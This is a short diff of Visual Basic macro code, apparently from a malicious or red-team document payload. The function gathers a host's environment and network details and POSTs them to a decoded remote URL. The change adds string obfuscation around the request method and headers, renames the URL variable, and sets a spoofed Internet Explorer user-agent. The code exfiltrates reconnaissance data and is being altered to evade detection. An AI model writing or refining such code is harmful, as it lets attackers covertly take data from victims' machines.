@@ -15,9 +15,9 @@ Function env_query() As String
 	env_query1 = env_query1 & Chr(10) & env_list()
 	env_query1 = env_query1 & Chr(10) & network_list()
 	decode(env_query1)
-	
-	URL = decode("[URL]")
-	env_query2.Open "POST", URL, False
+	var1 = decode("[URL]")
+	env_query2.Open decode("{[POST]}"), var1, False
+	env_query2.setRequestHeader decode("{[User-Agent]}"), decode("{[Mozilla/4.0 (compatible; Recon MSIE 6.0; Windows NT 5.0)]}")
 	env_query2.send(env_query1)
 End Function
 
